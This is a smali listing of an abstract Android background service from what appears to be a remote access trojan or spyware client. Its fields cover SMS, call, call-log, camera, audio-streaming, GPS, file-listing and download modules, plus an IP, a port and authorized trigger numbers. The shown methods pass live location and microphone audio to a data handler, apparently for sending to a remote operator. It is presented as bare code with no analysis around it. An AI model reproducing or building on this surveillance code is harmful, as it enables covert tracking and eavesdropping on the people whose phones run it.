.class public abstract Lmy/app/client/ClientListener;
.super Landroid/app/Service;
.source "ClientListener.java"

# interfaces
.implements Landroid/media/AudioRecord$OnRecordPositionUpdateListener;
.implements Landroid/location/LocationListener;


# instance fields
.field protected Callreceiver:Landroid/content/BroadcastReceiver;

.field public final ConnectivityCheckReceiver:Landroid/content/BroadcastReceiver;

.field protected SMSreceiver:Landroid/content/BroadcastReceiver;

.field public advancedInfos:Lmy/app/Library/AdvancedSystemInfo;

.field public audioStreamer:Lmy/app/Library/AudioStreamer;

.field authorizedNumbersCall:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field authorizedNumbersKeywords:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field authorizedNumbersSMS:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public callLogLister:Lmy/app/Library/CallLogLister;

.field public callMonitor:Lmy/app/Library/CallMonitor;

.field public dirLister:Lmy/app/Library/DirLister;

.field public fileDownloader:Lmy/app/Library/FileDownloader;

.field public gps:Lmy/app/Library/GPSListener;

.field public infos:Lmy/app/Library/SystemInfo;

.field ip:Ljava/lang/String;

.field protected isConnected:Z

.field public photoTaker:Lmy/app/Library/PhotoTaker;

.field port:I

.field public smsMonitor:Lmy/app/Library/SMSMonitor;

.field public toast:Landroid/widget/Toast;

.field waitTrigger:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 88
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 83
    const/4 v0, 0x1

    iput-boolean v0, p0, Lmy/app/client/ClientListener;->isConnected:Z

    .line 134
    new-instance v0, Lmy/app/client/ClientListener$1;

    invoke-direct {v0, p0}, Lmy/app/client/ClientListener$1;-><init>(Lmy/app/client/ClientListener;)V

    iput-object v0, p0, Lmy/app/client/ClientListener;->SMSreceiver:Landroid/content/BroadcastReceiver;

    .line 186
    new-instance v0, Lmy/app/client/ClientListener$2;

    invoke-direct {v0, p0}, Lmy/app/client/ClientListener$2;-><init>(Lmy/app/client/ClientListener;)V

    iput-object v0, p0, Lmy/app/client/ClientListener;->Callreceiver:Landroid/content/BroadcastReceiver;

    .line 229
    new-instance v0, Lmy/app/client/ClientListener$3;

    invoke-direct {v0, p0}, Lmy/app/client/ClientListener$3;-><init>(Lmy/app/client/ClientListener;)V

    iput-object v0, p0, Lmy/app/client/ClientListener;->ConnectivityCheckReceiver:Landroid/content/BroadcastReceiver;

    .line 91
    return-void
.end method


# virtual methods
.method public abstract handleData(I[B)V
.end method

.method public abstract loadPreferences()V
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .parameter "intent"

    .prologue
    .line 130
    const/4 v0, 0x0

    return-object v0
.end method

.method public onLocationChanged(Landroid/location/Location;)V
    .locals 2
    .parameter "location"

    .prologue
    .line 94
    iget-object v1, p0, Lmy/app/client/ClientListener;->gps:Lmy/app/Library/GPSListener;

    invoke-virtual {v1, p1}, Lmy/app/Library/GPSListener;->encode(Landroid/location/Location;)[B

    move-result-object v0

    .line 95
    .local v0, data:[B
    iget-object v1, p0, Lmy/app/client/ClientListener;->gps:Lmy/app/Library/GPSListener;

    invoke-virtual {v1}, Lmy/app/Library/GPSListener;->getChannel()I

    move-result v1

    invoke-virtual {p0, v1, v0}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 96
    return-void
.end method

.method public onMarkerReached(Landroid/media/AudioRecord;)V
    .locals 1
    .parameter "recorder"

    .prologue
    .line 125
    const-string v0, "Marker reached for audio streaming"

    invoke-virtual {p0, v0}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    .line 126
    return-void
.end method

.method public onPeriodicNotification(Landroid/media/AudioRecord;)V
    .locals 2
    .parameter "recorder"

    .prologue
    .line 114
    :try_start_0
    iget-object v1, p0, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    invoke-virtual {v1}, Lmy/app/Library/AudioStreamer;->getData()[B

    move-result-object v0

    .line 115
    .local v0, data:[B
    if-eqz v0, :cond_0

    .line 116
    iget-object v1, p0, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    invoke-virtual {v1}, Lmy/app/Library/AudioStreamer;->getChannel()I

    move-result v1

    invoke-virtual {p0, v1, v0}, Lmy/app/client/ClientListener;->handleData(I[B)V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    .line 121
    .end local v0           #data:[B
    :cond_0
    :goto_0
    return-void

    .line 118
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .locals 1
    .parameter "provider"

    .prologue
    .line 99
    const-string v0, "GPS desactivated"

    invoke-virtual {p0, v0}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    .line 100
    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .locals 1
    .parameter "provider"

    .prologue
    .line 103
    const-string v0, "GPS Activated"

    invoke-virtual {p0, v0}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 104
    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .locals 0
    .parameter "provider"
    .parameter "status"
    .parameter "extras"

    .prologue
    .line 108
    return-void
.end method

.method public abstract sendError(Ljava/lang/String;)V
.end method

.method public abstract sendInformation(Ljava/lang/String;)V
.end method
